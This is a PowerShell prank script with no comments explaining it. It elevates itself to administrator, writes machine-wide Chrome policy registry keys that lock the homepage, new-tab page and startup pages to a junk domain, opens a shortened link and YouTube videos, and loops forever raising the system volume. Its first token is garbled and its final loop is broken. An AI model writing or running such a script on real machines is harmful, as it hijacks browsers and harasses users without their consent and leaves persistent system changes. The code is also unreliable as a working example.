parparam([switch]$Elevated)

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false)  {
    if ($elevated) {
        # tried to elevate, did not work, aborting
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -elevated' -f ($myinvocation.MyCommand.Definition))
    }
    exit
}

Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
$testkeyurl = Test-Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs'
$testkeygoogle = Test-Path 'HKLM:\SOFTWARE\Policies\Google'
$testkeychrome = Test-Path 'HKLM:\SOFTWARE\Policies\Google\Chrome'
$testkeyreccommended = Test-Path 'HKLM:\Software\Policies\Google\Chrome\Recommended'
$testkeyrestoreurl = Test-Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs'
$spamsong = 1
if(-not($testkeygoogle)){
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Google'
    }
if(-not($testkeychrome)){
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome'
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageIsNewTabPage' -Value 0x00000000 -PropertyType DWORD -force
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'NewTabPageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
    }
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'NewTabPageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageLocation' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome' -Name 'HomepageIsNewTabPage' -Value 0x00000000 -PropertyType DWORD -force
if(-not($testkeyreccommended)){
    New-Item -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended'
    New-ItemProperty -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended' -Name 'RestoreOnStartup' -Value 0x00000004 -PropertyType DWORD -force
    }
if(-not($testkeyrestoreurl)){
    New-Item -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs'
    New-ItemProperty -Path 'HKLM:\Software\Policies\Google\Chrome\Recommended\RestoreOnStartupURLs' -Name '1' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String -force
    }

#Making sure the user has the key before the process can continue
if(-not($testkeyurl)){
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs'
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Google\Chrome\RestoreOnStartupURLs' -Name  '1' -Value 'www.111111111111111111111111111111111111111111111111111111111111.com' -PropertyType String  –Force
    }

if($true){ 
    [system.Diagnostics.Process]::Start("chrome","https://shrekis.life/W15JAH")
    [system.Diagnostics.Process]::Start("chrome","https://www.youtube.com/watch?v=SjHUb7NSrNk")
    }

while ($true) {
$obj = new-object -com wscript.shell
$obj.SendKeys([char]175)
}
Do{
    $spamsong
    $spamsong + 1
    [system.Diagnostics.Process]::Start("chrome","https://www.youtube.com/watch?v=Nyrwfy458Bw")
    }
Until($spamsong = 25)
